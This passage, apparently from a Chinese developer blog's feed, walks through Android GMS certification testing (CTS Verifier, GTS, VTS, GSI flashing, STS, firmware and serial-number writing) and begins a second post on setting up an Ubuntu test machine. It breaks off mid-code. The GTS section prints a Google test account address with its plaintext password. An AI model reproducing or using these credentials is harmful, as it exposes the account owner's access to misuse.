算是CTS的一部分，需要手动进行，主要用于测试那些自动测试系统无法测试的功能，比如相机、传感器等。由于硬件配置或其他原因，不同手机上部分测试项目被隐藏，也就是说CTS Verifier中case的总数，取决于测试机支持哪些功能。</p><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><ul><li><p>PC 端执行如下指令：<code>adb shell settings put global hidden_api_policy 1</code></p></li><li><p>安装 CtsVerifier.apk : <code>adb install -r -g CtsVerifier.apk</code></p></li><li><p>CtsVerifier的权限全部授予，语言也要切成英文</p></li><li><p>看CtsVerifier测试文档，进行具体操作</p></li><li><p>最后要输入日志需要如下指令</p><ul><li><code>adb shell appops set com.android.cts.verifier android:read_device_identifiers allow</code></li><li><code>adb shell appops set com.android.cts.verifier MANAGE_EXTERNAL_STORAGE 0</code></li></ul></li><li><p>查看cpu架构指令：<code>adb shell getprop ro.product.cpu.abi</code></p></li></ul><p>tip：如果电脑连接了多台设备，在执行adb时可以在adb后通过 <code>-s SerialNumber</code> 进行指定设备执行，例如<code>adb -s TVE1070M001 -s TVE1070M002 install -r -g CtsVerifier.apk</code></p><h4 id="Camera-FOV测试"><a href="#Camera-FOV测试" class="headerlink" title="Camera FOV测试"></a>Camera FOV测试</h4><ul><li><p>使用 A3 打印纸，无缩放打印 <code>calibration-pattern.pdf</code> 文件。</p></li><li><p>将打印的目标图样挂在墙上，将待测设备 Camera 与目标图样按<code>calibrationProcedure.pdf</code>进行放置。</p><p>上面设计到的两个pdf文件在 old 中</p></li></ul><h4 id="ITS测试"><a href="#ITS测试" class="headerlink" title="ITS测试"></a>ITS测试</h4><ol><li>进入CameraITS&#x2F;目录，执行下面配置环境指令</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ source build/envsetup.sh</span><br></pre></td></tr></table></figure><ol start="2"><li>Mobly 框架下，可以在 config.yml (YAML)文件中配置 Mobly 测试平台。（具体配置参照下图）</li></ol><p><img src="/upload/image-20231012111920117.png" alt="image-20231012111920117"></p><p>​    3. 测试所有摄像头和所有场景 <code>$ python tools/run_all_tests.py</code></p><p>​4. 后摄场景一全部测试 <code>$ python tools/run_all_tests.py camera=0 scenes=scene0</code></p><pre><code>5. 单独模块测试 `$ python tests/scene1/test_ev_compensation_basic.py camera=0 scenes=scene1`</code></pre><h2 id="4、-GTS"><a href="#4、-GTS" class="headerlink" title="4、 GTS"></a>4、 GTS</h2><h3 id="4-1-GTS介绍"><a href="#4-1-GTS介绍" class="headerlink" title="4.1 GTS介绍"></a>4.1 GTS介绍</h3><p>Google Mobile Services Test Suite 意为谷歌移动服务测试套件，谷歌移动服务提供了**Search、 Search by Voice、Gmail、Contact Sync、 Calendar Sync、Talk、 Maps、 Steet View、 YouTube、 Android Market (Play store)**等服务，当用户使用谷歌时，谷歌可以把各种广告嵌入到谷歌的服务中。</p><h3 id="4-2-GTS测试"><a href="#4-2-GTS测试" class="headerlink" title="4.2 GTS测试"></a>4.2 GTS测试</h3><p>需注意，测试时需要在环境变量中指定一个json文件，下载该文件并放在本地文件夹后，需要在环境变量中添加如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Android13</span><br><span class="line">export APE_API_KEY=/home/hu/gms/gts/gts-windriver-public.json</span><br><span class="line">Android12</span><br><span class="line">export APE_API_KEY=/home/hu/gms/gts/gts-fih-public.json</span><br></pre></td></tr></table></figure><h3 id="4-3-GTS-Verifier测试"><a href="#4-3-GTS-Verifier测试" class="headerlink" title="4.3 GTS Verifier测试"></a>4.3 GTS Verifier测试</h3><p>这一项只有在Android13及以上版本才有，和CTS Verifier测试类似，需要登陆专门的谷歌测试账号</p><p>账号：<a href="mailto:&#x74;&#101;&#115;&#116;&#x30;&#x30;&#53;&#51;&#x34;&#x34;&#x40;&#116;&#104;&#46;&#100;&#x6f;&#x2d;&#97;&#x66;&#x77;&#x2e;&#99;&#111;&#x6d;">&#x74;&#101;&#115;&#116;&#x30;&#x30;&#53;&#51;&#x34;&#x34;&#x40;&#116;&#104;&#46;&#100;&#x6f;&#x2d;&#97;&#x66;&#x77;&#x2e;&#99;&#111;&#x6d;</a></p><p>密码：rec5rbie</p><p>GTS Verifier的相关工具存放在GTS的文件夹中</p><p>安装 GtsVerifier.apk : <code>adb install -r -g GtsVerifier.apk</code></p><p>保存测试结果：<code>adb shell appops set com.google.android.gts.ve rifier android:read_device_identifiers allow</code></p><p><code>adb shell appops set com.google.android.gts.verifier MANAGE_EXTERNAL_STORAGE 0</code></p><h2 id="5、VTS"><a href="#5、VTS" class="headerlink" title="5、VTS"></a>5、VTS</h2><h3 id="5-1-VTS介绍"><a href="#5-1-VTS介绍" class="headerlink" title="5.1 VTS介绍"></a>5.1 VTS介绍</h3><p>Vendor Test Suite 意为供应商测试套件。以前Android的系统升级是很麻烦的，为了能更快的将设备升级到新的Android版本，Android O 开始新引入了 Project Treble，Project Treble 适用于搭载 Android O 及后续版本的所有新设备。Android 7.x 及更早版本中没有正式的Vendor层接口，因此每次更新系统都相对耗时和困难。Android O 之后，Treble 提供了稳定的Vendor层接口，供设备制造商访问 Android 代码中特定于硬件的部分，这样就可以只更新框架层，减少升级系统带来的成本和困难。为了确保Vendor层实现的前向兼容性，新的Vendor层接口会由供应商测试套件 (VTS) 进行验证，该套件类似于兼容性测试套件 (CTS)。</p><h3 id="5-2-VTS测试"><a href="#5-2-VTS测试" class="headerlink" title="5.2 VTS测试"></a>5.2 VTS测试</h3><h4 id="替换谷歌system-img"><a href="#替换谷歌system-img" class="headerlink" title="替换谷歌system.img"></a>替换谷歌system.img</h4><p><strong>VTS</strong> 测试要求刷入谷歌提供 <strong>AOSP</strong> 的 <strong>system.img (GSI)</strong> 。在 <strong>user</strong> 版本中，如果直接使用 <strong>flash tool</strong> 单独烧录<strong>GSI</strong>时，会导致无法开机。之所以会出现这种问题，是由于在 <strong>user&#x2F;userdebug</strong> 版本中， <strong>dm-verity</strong> 是使能的，替换 <strong>GSI</strong> 后导致 <strong>dm-verity</strong> 不能通过。 如果要解决这个问题，就需要进行 <strong>unlock</strong> 操作，并且要用 <strong>fastboot</strong> 来刷入谷歌提供的 <strong>system.img</strong> 。</p><p><strong>烧录具体操作如下：</strong></p><p>烧录时推荐采用windows，如果烧录在<code>fastboot reboot fastboot</code>这一步卡住，windows的问题是<strong>驱动未更新</strong>，需要<strong>手动到设置-更新和安全-查看可选更新，更新对应平台和安卓的驱动</strong>。如果是Ubuntu卡住，则可能是 fastboot 版本问题。</p><ul><li><p>在设置中打开System -&gt; Developer options -&gt; <strong>OEM unlocking</strong> 选项</p></li><li><p>在设置中打开 <strong>USB debugging</strong> 选项</p></li><li><p>手机连接到电脑上，输入 <strong>adb devices</strong> 命令确认 <strong>adb</strong> 可以正常使用</p></li><li><p>进入 <strong>fastboot</strong> 模式。方法一： <code>adb reboot bootloader</code>；方法二：长按音量 + 和电源键</p></li><li><p>执行命令 <code>fastboot flashing unlock</code> ，执行命令后需要选择音量 <strong>+</strong> ，确认设备已经 <strong>unlock</strong> </p></li><li><p>执行命令<code>fastboot getvar unlocked</code> 确定设备 unlock 成功</p></li><li><p><del>擦除数据分区： <code>fastboot -w</code></del></p></li><li><p><del>擦除<strong>system.img</strong> 分区： <code>fastboot erase system</code></del></p></li><li><p>刷入user固件中的 vendor_boot 和 preloader_a  <strong>（如果是刷 GSI 则不需要这步）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Android13：</span><br><span class="line">fastboot flash vendor_boot vendor_boot-debug.img </span><br><span class="line"># 如果固件中没有 vendor_boot-debug.img，则将上面的指令替换成下面这条指令</span><br><span class="line">fastboot flash boot boot-debug.img </span><br><span class="line"></span><br><span class="line">fastboot flash preloader_a preloader_tb8781p1_64_wifi.bin</span><br><span class="line">Android12：</span><br><span class="line">fastboot flash boot boot-debug.img</span><br></pre></td></tr></table></figure></li><li><p>将 Android 设备重新启动到 Fastboot 模式<code>fastboot reboot fastboot</code></p></li><li><p>执行 <strong>fastboot</strong> 命令刷入对应的 **system.img (在GSI文件夹下)**： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Android13：</span><br><span class="line">fastboot flash system system.img</span><br><span class="line">Android12：</span><br><span class="line">fastboot flash system_a system.img</span><br><span class="line">fastboot flash system_b system.img</span><br></pre></td></tr></table></figure></li><li><p>重启： <code>fastboot reboot</code></p></li></ul><h2 id="6、GSI"><a href="#6、GSI" class="headerlink" title="6、GSI"></a>6、GSI</h2><h3 id="6-1-GSI介绍"><a href="#6-1-GSI介绍" class="headerlink" title="6.1 GSI介绍"></a>6.1 GSI介绍</h3><p>（Generic system image）— Reference AOSP system image通用系统映像上的兼容性测试套件<br> 这个文件包也是签约获取授权后才能获取，Google也会定期更新GSI包。Android O要求测试VTS和CTS on GSI，此时对应版本必须是GSI版本，测试包都为VTS。</p><h3 id="6-2-GSI测试"><a href="#6-2-GSI测试" class="headerlink" title="6.2 GSI测试"></a>6.2 GSI测试</h3><p><strong>烧录具体操作如下：</strong></p><p>烧录时推荐采用windows，如果烧录在<code>fastboot reboot fastboot</code>这一步卡住，windows的问题是驱动未更新，需要手动到设置-更新和安全-查看可选更新，更新对应平台和安卓的驱动。如果是Ubuntu卡住，则可能是 fastboot 版本问题。</p><ul><li><p>在设置中打开System -&gt; Developer options -&gt; <strong>OEM unlocking</strong> 选项</p></li><li><p>在设置中打开 <strong>USB debugging</strong> 选项</p></li><li><p>手机连接到电脑上，输入 <strong>adb devices</strong> 命令确认 <strong>adb</strong> 可以正常使用</p></li><li><p>进入 <strong>fastboot</strong> 模式。方法一： <code>adb reboot bootloader</code>；方法二：长按音量 + 和电源键</p></li><li><p>执行命令 <code>fastboot flashing unlock</code> ，执行命令后需要选择音量 <strong>+</strong> ，确认设备已经 <strong>unlock</strong> </p></li><li><p>执行命令<code>fastboot getvar unlocked</code> 确定设备 unlock 成功</p></li><li><p>将 Android 设备重新启动到 Fastboot 模式<code>fastboot reboot fastboot</code></p></li><li><p>执行 <strong>fastboot</strong> 命令刷入对应的 **system.img (GSI)**： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Android13：</span><br><span class="line">fastboot flash system system.img</span><br><span class="line">Android12：</span><br><span class="line">fastboot flash system_a system.img</span><br><span class="line">fastboot flash system_b system.img</span><br></pre></td></tr></table></figure></li><li><p>重启： <code>fastboot reboot</code></p></li></ul><h2 id="7、STS"><a href="#7、STS" class="headerlink" title="7、STS"></a>7、STS</h2><h3 id="7-1-STS介绍"><a href="#7-1-STS介绍" class="headerlink" title="7.1 STS介绍"></a>7.1 STS介绍</h3><p>Android Security Test Suite (STS). 是谷歌关于android安全补丁安装情况的一个测试套件STS和security patch相关的，是CTS测试新增加一项安全测试套件。STS是201808才开始测试的。Security patch日期在3个月内是GTS的一个case，如果不通过无法获得google认证。在18年5月之前谷歌对于security patch这个属性都是在build库下面跟着aosp更新的。现在需要通过STS之后由vendor来更新。STS需要通过userdebug版本的targetfile来生成一个user版本的结果。</p><h3 id="7-2-STS测试流程"><a href="#7-2-STS测试流程" class="headerlink" title="7.2 STS测试流程"></a>7.2 STS测试流程</h3><p><strong>STS测试需要将待测设备烧录debug固件</strong>，debug固件一般存放在user固件旁边的文件夹中</p><h2 id="8、CheckList"><a href="#8、CheckList" class="headerlink" title="8、CheckList"></a>8、CheckList</h2><p>CheckList测试根据CheckList的excel表，找到对应的页面，按照上面的介绍进行测试。</p><p>其中有不少是在首次开机的引导界面要求登录谷歌账号等操作。</p><p>如果首次开机会跳过引导界面，需要重新烧录SN码</p><h2 id="9、机器烧录"><a href="#9、机器烧录" class="headerlink" title="9、机器烧录"></a>9、机器烧录</h2><p>系统：windows</p><p>在初次使用时需要安装驱动，文件为<code>安装文件/烧录工具/DriverInstall.exe</code></p><h3 id="9-1-固件烧录"><a href="#9-1-固件烧录" class="headerlink" title="9.1 固件烧录"></a>9.1 固件烧录</h3><p>工厂直接发过来的机器固件和SN码都不是最新的，一般拿到手时需要自己刷上最新的固件和SN码</p><p>拿到固件后，通过固件烧录工具进行烧录，这里固件烧录工具是Smart Phone Flash Tool，kernel版本为4.19及以下工具为V5，4.19以上工具为V6。查看kernel的方式：<code>adb shell</code> <code>cat /proc/version</code></p><p><img src="/upload/image-20231017153331058.png" alt="image-20231017153331058"></p><p>该工具如上图，左上角有一个Auto Reboot 可以选上，用途是烧录完成自动重启设备。</p><p>右上角的Download-XML 需要选中固件文件夹中的 <code>images/download_agent/flash.xml</code> ，选中后下方的Downlad会出现许多项目，将升级方式选为 <code>Firmware Upgrade</code>，该升级方式是升级，效果为保留SN码，将其他内容格式化，然后进行升级。其他还有两个选项为全部格式化，和仅下载文件。</p><p>在选完上述内容后点击Download，再将<strong>关机状态</strong>下的设备用数据线连接上电脑，即可自动开始烧录固件。</p><p>版本V5稍微有些不同，选取文件时不是选取的 Download-xml，而是Scatter-loading File，这里是选取一个txt文件，在固件的image目录下会有一个XXXXXX_Android_scatter.txt文件。</p><h3 id="9-2-SN码烧录"><a href="#9-2-SN码烧录" class="headerlink" title="9.2 SN码烧录"></a>9.2 SN码烧录</h3><p>SN码烧录工具为SN Writer V1.2152.0.0，界面如下，这个工具每一个项目对应的版本都不一样。在打开时可能会遇到下面问题：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">由于找不到 MSVCR120.dll，无法继续执行代码。重新安装程序可能会解决此问题。</span><br></pre></td></tr></table></figure><p>这个问题是电脑未安装32位的vc++程序包导致的，安装一下就好了，文件为<code>vcredist_x86.exe</code></p><p><img src="/upload/image-20231017164620806.png" alt="image-20231017164620806.png"></p><p>烧录时先点击上面的Key Files，选中对应版本的<code>MTK HDCP/DRM KEY</code>，这个是要选择文件夹，一般是drmkey文件夹，这里的文件夹是每个项目对应的，不在固件中，我使用时是别人直接发我的。</p><p>然后选择<code>attestation Key</code>，这个是选择一个googlekey的bin文件，一般是在drmkey文件夹外面的bin文件，而不是drmkey里面的。</p><p>设置完这两个后再点击上面图片中的<code>System Config</code>，选中第一个 Barcode，就是烧录sn码了，其他的选项大部分是通讯设备用的，WiFi和蓝牙一般也不需要。System Config 界面的最下方需要选一个<code>AP_DB</code>文件，该文件是取自固件中的 images文件夹下的 <code>APDB_CPU型号_固件版本号</code> 文件，有多个话选择版本号数字最大的那个。设置完成点击SAVE，就可以点击START，此时要求输入SN码，SN只能字母(无论大小写)+数字；比如1070的项目，可以写：TVE1070M00001；sn的长度最好控制在8-15个字符。</p><p>SN码输入完成后将关机状态的设备连接数据线插上电脑，会自动开始烧录，烧录完不会自动开机，需要手动开机，然后连接adb验证是否烧录成功。</p>]]></content>
    
    
    <categories>
      
      <category>android</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GMS测试环境搭建</title>
    <link href="/2023/11/24/GMS%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2023/11/24/GMS%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="GMS测试环境搭建"><a href="#GMS测试环境搭建" class="headerlink" title="GMS测试环境搭建"></a>GMS测试环境搭建</h2><p>环境要求是Ubuntu系统，所以需要额外申请一台电脑，接下来从装系统开始教程。</p><h3 id="0、系统环境"><a href="#0、系统环境" class="headerlink" title="0、系统环境"></a>0、系统环境</h3><p>从官网下载Ubuntu 的iso镜像（本文中安装系统为Ubuntu <del>22.04.3</del> 18.04.6 LTS 最初是使用22.04.3，但是后面说环境太新可能会有问题，所以重装为18.04.6），采用Rufus工具烧录U盘为系统启动盘。（文件已经下好，存放在： <code>安装文件/安装Ubuntu系统</code>） </p><p>插上U盘开机进入BIOS，选择对应U盘启动，按照流程安装系统（此处可以搜索教程，网上很多）</p><p>为了后续方便操作，给Ubuntu安装上必要的工具，方便后续传递文件和SSH连接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update &amp;&amp; sudo apt upgrade -y</span><br><span class="line">sudo apt install openssh-server -y</span><br><span class="line">sudo apt install vim -y</span><br></pre></td></tr></table></figure><p>Ubuntu22.04.3和18.04.6都默认会自动挂载，而我们需要关闭自动挂载</p><p>在Ubuntu 18.04.6中 只需要使用下列指令就可以关闭自动挂载</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gsettings set org.gnome.desktop.media-handling automount false</span><br></pre></td></tr></table></figure><p><del>而Ubuntu 22.04.3 尝试了上面指令和关闭udisks2.service服务都未能成功关闭自动挂载</del></p><p><del>Ubuntu 22.04.3 默认安装了python 3.10.12， 但是没有安装jdk。</del></p><p>Ubuntu 18.04.6 默认安装了python 3.6.9， 但是没有安装jdk。</p><p>还有一个小插曲，Ubuntu 22.04.3可以自动安装我的Realtek 8821CE无线网卡，而Ubuntu 18.04.6 需要手动安装，（可以在StackOverflow搜到安装教程）。这是因为网卡太新了，旧的网卡就没用这个问题。</p><p>先创建所需要的文件夹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p gms/jdk gms/python gms/sdk_tools gms/gts gms/cts gms/sts gms/vts</span><br></pre></td></tr></table></figure><p>然后用 ftp 将工具移动到对应的文件夹中 ，可以在后面安装的时候再装对应的工具。其实这些目录结构不重要，按照自己的习惯来也行。</p><h3 id="1、jdk安装"><a href="#1、jdk安装" class="headerlink" title="1、jdk安装"></a>1、jdk安装</h3><p>安卓官方文档中有要求安装正确版本的Java开发工具包</p><p>文档中原文如下：</p><ul><li>对于 Android 11，安装 OpenJDK11。</li><li>对于 Android 9 和 Android 10，请安装 OpenJDK9。</li><li>对于 Android 7.0、7.1、8.0 和 8.1，请安装 OpenJDK8。</li></ul><p>这里先全部安装上，需要用哪个配置哪个的环境变量。（文件在 <code>安装文件/jdk/</code> ）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">cd jdk</span><br><span class="line">tar -zxvf jdk-11.0.20_linux-x64_bin.tar.gz</span><br><span class="line">tar -zxvf jdk-21_linux-x64_bin.tar.gz</span><br><span class="line">tar -zxvf jdk-8u381-linux-x64.tar.gz</span><br><span class="line">unzip openjdk-9+181_linux-x64_ri.zip</span><br><span class="line"># 解压完改一下名字</span><br><span class="line">mv java-se-9-ri/ jdk-9</span><br><span class="line">mv jdk-11.0.20/ jdk-11</span><br><span class="line">mv jdk1.8.0_381/ jdk-8</span><br><span class="line"># 安装把压缩包可以删掉（不删也行）</span><br><span class="line">rm -rf jdk-11.0.20_linux-x64_bin.tar.gz</span><br><span class="line">rm -rf jdk-21_linux-x64_bin.tar.gz</span><br><span class="line">rm -rf jdk-8u381-linux-x64.tar.gz</span><br><span class="line">rm -rf openjdk-9+181_linux-x64_ri.zip</span><br></pre></td></tr></table></figure><p>官方文档只有说明这几个安卓版本，对于Android12的工具包同样应该使用jdk11，但在使用 <code>sdkmanager</code> 的时候使用jdk11会报错：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; java.lang.UnsupportedClassVersionError: com/android/sdklib/tool/sdkmanager/SdkManagerCli has been compiled by a more recent version of the Java Runtime (class file version 61.0), this version of the Java Runtime only recognizes class file versions up to 55.0</span><br></pre></td></tr></table></figure><p>所以使用sdkmanager时需要使用更新的，当时去官网下载了最新的jdk，为jdk21。</p><p>在 <code>~/.bashrc</code> 中配置环境变量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export JAVA_HOME=/home/hu/gms/jdk/jdk-21</span><br><span class="line">export PATH=$JAVA_HOME/bin:$PATH</span><br><span class="line">export CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar</span><br></pre></td></tr></table></figure><p>编辑完成需要执行 <code>source ~/.bashrc</code>使其立即生效</p><p>在后续教程中使用完 <code>sdkmanager</code> 后需要切换回 jdk11</p><h3 id="2、sdk安装"><a href="#2、sdk安装" class="headerlink" title="2、sdk安装"></a>2、sdk安装</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://developer.android.com/tools?hl=zh-cn</span><br></pre></td></tr></table></figure><p>上面链接文档中给出了命令行工具的介绍，这里的sdk并不是整套sdk代码，实际上需要的是sdk中的命令行工具，主要是以下三个工具。</p><h4 id="2-1-cmdline-tools"><a href="#2-1-cmdline-tools" class="headerlink" title="2.1 cmdline-tools"></a>2.1 cmdline-tools</h4><p>旧版教程中是给了一个网站直接下载sdk，但是目前官网上已经没有单独的SDK下载安装包了。谷歌官网推荐的是下载包含有Android SDK的Android Studio，而我们又不需要Android Studio。</p><p>好在官网上有sdk-tools可以直接下载，下面链接进入官网，拉到最下面，是可以看到有一个<code>仅限命令行工具</code>，下载Linux平台对应版本。（该文件在 <code>安装文件/sdk工具/platform-tools_r34.0.4-linux.zip</code>）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://developer.android.com/studio?hl=zh-cn#command-tools</span><br></pre></td></tr></table></figure><p>这里下载的是Android SDK 命令行工具软件包（位于 <code>cmdline-tools</code>），它取代了 旧版SDK 工具软件包（位于 <code>tools</code>）。所以在旧版的教程中没有提到 <code>cmdline-tools</code> ，而是 <code>tools</code>。</p><h4 id="2-2-platform-tools"><a href="#2-2-platform-tools" class="headerlink" title="2.2 platform-tools"></a>2.2 platform-tools</h4><p>这个工具官网说：如果你是安卓开发者，最好通过 <code>sdkmanager</code> 来获取最新的 <code>Platform-Tools</code>。如果只想使用这些工具，可以直接下载。我们可以选择直接下载的方式，通过下面的链接下载适用于Linux的platform-tools即可。（该文件在 <code>安装文件/sdk工具/platform-tools_r34.0.4-linux.zip</code>）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://developer.android.com/studio/releases/platform-tools?hl=zh-cn#downloads.html</span><br></pre></td></tr></table></figure><h4 id="2-3-build-tools"><a href="#2-3-build-tools" class="headerlink" title="2.3 build-tools"></a>2.3 build-tools</h4><p>build-tools无法从官网直接下载，官网提供了从命令行下载 Android SDK Build Tools的方法，即使用 <code>sdkmanager</code>并运行以下命令：<code>sdkmanager &quot;build-tools;build-tools-version&quot;</code> （这里的<code>build-tools-version</code>是具体的版本号）</p><p>sdkmanager来源于之前安装的 cmdline-tools，所以一定要先将前面的搞定才能执行该指令。</p><p>这里创建一个文件夹 <code>sdk_tools</code> 来存放这三个工具。可以直接将前两个工具下载的zip压缩包拷贝到这个目录下，使用unzip进行解压即可将前两个工具安装成功。</p><p>这里在<code>cmdline-tools</code>解压后，还需要在cmdline-tools目录下创建一个<code>latest</code>的文件夹，并把cmdline-tools目录下所有文件都移到<code>latest</code>里，不然每次执行<code>sdkmanager</code>指令都得额外带参数<code>--sdk_root=.</code> 。目录大致像下面这样：</p><p><img src="/upload/20210406200655428.png" alt="20210406200655428"></p><p>具体指令如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd cmdline-tools</span><br><span class="line">mkdir latest</span><br><span class="line">mv bin/ lib/ NOTICE.txt source.properties latest/</span><br></pre></td></tr></table></figure><p>在这两个工具安装成功之后，还需要将Java的环境变量进行升级，之前使用的jdk11会报错，具体的错误在上面的jdk安装中有写到，所以我更换环境变量中的jdk为jdk-21。</p><p>万事俱备之后在 <code>sdk_tools</code>目录下执行该指令(指令中的33.0.2是我当时能下载的版本的最新版)：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmdline-tools/latest/bin/sdkmanager &quot;build-tools;33.0.2&quot;</span><br></pre></td></tr></table></figure><p>执行该指令会需要同意一个许可，然后就安装成功了，此时<code>sdk_tools</code>目录下存在<code>build-tools</code> 、<code>cmdline-tools</code> 、<code>platform-tools</code>三者就是成功了，还会多一个<code>licenses</code>，这个是许可证，倒是不用管。</p><h4 id="2-4-环境变量"><a href="#2-4-环境变量" class="headerlink" title="2.4 环境变量"></a>2.4 环境变量</h4><p>在<code> ~/.bashrc</code>的最后添加下面内容，之所以在该文件下修改而不是&#x2F;etc&#x2F;profile，是因为服务器是多人共用的，环境变量设置为个人环境变量比较好，不容易引起其他人的故障。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export PATH=/home/hu/gms/sdk_tools/cmdline-tools/latest/bin:$PATH</span><br><span class="line">export PATH=/home/hu/gms/sdk_tools/platform-tools:$PATH</span><br><span class="line">export PATH=/home/hu/gms/sdk_tools/build-tools/33.0.2:$PATH</span><br></pre></td></tr></table></figure><p>修改完进行保存，然后执行 <code>source .bashrc</code> 即更新环境变量成功，后面执行几行命令看是否成功安装。</p><p><img src="/upload/image-20231007144713496.png" alt="image-20231007144713496"></p><p>这里分别执行了 <code>adb --version</code> , <code>sdkmanager --version</code> , <code>aapt</code> 三条指令，如果结果和我截图一致，工具即安装成功。<strong>安装成功之后记得把jdk环境变量设置为对应项目的jdk，例如我的就设置回jdk-11</strong>。</p><h3 id="3、python安装"><a href="#3、python安装" class="headerlink" title="3、python安装"></a>3、python安装</h3><p>在进行CTS Verifier中的ITS测试时需要python环境，还需要安装图像处理相关的库</p><p>翻看了以前的教程，在Android12和Android13的GMS测试时用的python版本都是3.7.10，所以为了避免因为python版本不一致导致问题，我也同样选择python3.7.10。在服务器中默认是装上了python3.10的，为了方便python版本管理和包管理，选择采用anaconda来管理包（这里安卓官方文档要求使用 virtualenv 创建虚拟环境，以前的旧版教程也都是使用 virtualenv 来创建虚拟环境，所以我将两种方案都记录下来，自己采用的anaconda）。</p><h4 id="3-1-方案一：Virtualenv（直接转载的之前的教程，我用的方案二）"><a href="#3-1-方案一：Virtualenv（直接转载的之前的教程，我用的方案二）" class="headerlink" title="3.1 方案一：Virtualenv（直接转载的之前的教程，我用的方案二）"></a>3.1 方案一：Virtualenv（直接转载的之前的教程，我用的方案二）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 安装Python开发包</span><br><span class="line">sudo apt-get install python-dev</span><br><span class="line"># 安装 Protocol Buffer⼯具</span><br><span class="line">sudo apt-get install python-protobuf</span><br><span class="line">sudo apt-get install protobuf-compiler</span><br><span class="line"># 安装 Python 虚拟环境相关⼯具</span><br><span class="line">sudo apt-get install python-virtualenv</span><br><span class="line">sudo apt-get install python-pip</span><br><span class="line"># 如果是python3, 单独装下⾯这个:</span><br><span class="line">sudo apt install virtualenv</span><br></pre></td></tr></table></figure><p>环境搭建问题及解决⽅法:</p><p>如果出现⽆法创建虚拟环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt autoremove python-virtualenv</span><br><span class="line">sudo apt autoremove virtualenv</span><br><span class="line">sudo ln -sf ~/.local/bin/pip2 /usr/bin/pip</span><br><span class="line">pip install --user virtualenv</span><br></pre></td></tr></table></figure><p>tsPythonVirtualenvPreparer: Failed to create virtualenv with问题 更新pip⾄9.0以上python更新⾄3.0</p><p><strong>CTS Verifier 中的ITS测试所需环境</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 